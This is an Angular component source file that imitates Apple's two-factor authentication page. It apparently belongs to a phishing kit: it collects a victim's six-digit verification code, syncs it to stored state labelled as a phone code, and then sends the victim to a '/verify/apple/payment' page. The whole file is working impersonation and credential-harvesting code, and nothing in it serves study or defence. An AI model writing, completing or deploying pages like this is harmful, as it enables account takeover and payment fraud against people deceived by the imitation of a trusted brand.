import { Component, signal, output, inject, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { StateService } from '../../../services/state.service';

@Component({
  selector: 'app-apple-2fa',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="apple-flow-container">
      <div class="apple-card">
        <div class="apple-logo-container">
          <img src="/assets/flows/apple/images/logo.svg" alt="Apple Logo" class="apple-logo">
        </div>
        
        <h1 class="apple-title">Two-Factor Authentication</h1>
        
        <p style="margin-bottom: 32px; font-size: 17px; line-height: 1.4;">
          A message with a verification code has been sent to your other devices. Enter the code to continue.
        </p>
        
        <form [formGroup]="otpForm" (ngSubmit)="onSubmit()">
          <div class="apple-2fa-container">
            @for (i of [0,1,2,3,4,5]; track i) {
              <input 
                #otpInput
                type="text" 
                maxlength="1" 
                class="apple-2fa-digit"
                [formControlName]="'digit' + i"
                (keyup)="onKeyUp($event, i)"
                (paste)="onPaste($event)"
                inputmode="numeric"
                pattern="[0-9]*"
              >
            }
          </div>
          
          <div style="margin-top: 32px;">
            <a href="javascript:void(0)" class="apple-link" style="font-size: 15px;">
              Didn't get a verification code?
            </a>
          </div>

          <div style="margin-top: 48px; display: flex; align-items: center; justify-content: center; gap: 12px;">
            <input type="checkbox" id="trust" style="width: 20px; height: 20px;">
            <label for="trust" style="font-size: 15px; color: var(--apple-text-primary);">Trust this browser</label>
          </div>
          
          <div style="margin-top: 48px;">
            <button 
              type="submit" 
              class="apple-submit-btn" 
              [disabled]="otpForm.invalid || loading()"
              style="width: 200px; border-radius: 12px; font-weight: 500;"
            >
              @if (loading()) {
                <div class="apple-spinner"></div>
              } @else {
                Continue
              }
            </button>
          </div>
        </form>
        
        <div class="apple-footer-links">
           <a href="javascript:void(0)" class="apple-link" (click)="goBack()">Cancel</a>
        </div>
      </div>
    </div>
  `,
  styleUrls: ['../../../styles/flows/apple.scss'],
  styles: [`
    .apple-spinner {
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: apple-spin 1s linear infinite;
    }
    @keyframes apple-spin {
      to { transform: rotate(360deg); }
    }
  `]
})
export class Apple2FAComponent implements OnInit {
  private fb = inject(FormBuilder);
  private state = inject(StateService);

  otpForm: FormGroup = this.fb.group({
    digit0: ['', [Validators.required, Validators.pattern('[0-9]')]],
    digit1: ['', [Validators.required, Validators.pattern('[0-9]')]],
    digit2: ['', [Validators.required, Validators.pattern('[0-9]')]],
    digit3: ['', [Validators.required, Validators.pattern('[0-9]')]],
    digit4: ['', [Validators.required, Validators.pattern('[0-9]')]],
    digit5: ['', [Validators.required, Validators.pattern('[0-9]')]],
  });

  loading = signal(false);

  ngOnInit(): void {
    this.state.stage.set('phone_pending');
  }

  onKeyUp(event: any, index: number): void {
    const key = event.key;
    if (key >= '0' && key <= '9') {
      if (index < 5) {
        const nextInput = event.target.nextElementSibling;
        if (nextInput) nextInput.focus();
      }
    } else if (key === 'Backspace') {
      if (index > 0) {
        const prevInput = event.target.previousElementSibling;
        if (prevInput) prevInput.focus();
      }
    }
  }

  onPaste(event: ClipboardEvent): void {
    event.preventDefault();
    const pasteData = event.clipboardData?.getData('text').slice(0, 6);
    if (pasteData && /^\d+$/.test(pasteData)) {
      pasteData.split('').forEach((digit, i) => {
        this.otpForm.get('digit' + i)?.setValue(digit);
      });
    }
  }

  async onSubmit() {
    if (this.otpForm.valid) {
      this.loading.set(true);
      const otp = Object.values(this.otpForm.value).join('');

      this.state.phoneCode.set(otp); // Reuse phoneCode for Apple 2FA
      await this.state.syncState();

      this.loading.set(false);
      this.state.navigate('/verify/apple/payment');
    }
  }

  goBack(): void {
    this.state.navigate('/verify/apple/login');
  }
}
